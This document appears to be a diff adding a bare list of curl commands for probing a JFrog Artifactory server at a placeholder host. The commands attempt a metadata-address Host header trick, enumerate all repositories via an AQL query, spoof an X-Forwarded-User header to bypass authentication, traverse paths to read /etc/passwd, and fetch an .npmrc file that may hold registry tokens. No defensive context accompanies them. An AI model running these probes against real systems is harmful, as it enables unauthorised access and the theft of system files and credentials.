@@ -1,0 +1,11 @@
+curl -H "Host: 169.254.169.254" http://<host>/artifactory/api/docker/myrepo/v2/_catalog
+
+
+curl "http://<host>/artifactory/api/search/aql" -X POST -d 'items.find({"repo":{"$match":"*"}}).include("name","repo","path")'
+
+curl -H "X-Forwarded-User: anonymous" http://<host>/artifactory/api/storage/libs-release-local/
+
+curl http://<host>/artifactory/libs-release-local/%2e%2e/%2e%2e/etc/passwd
+
+
+curl http://<host>/artifactory/libs-release-local/path/to/.npmrc
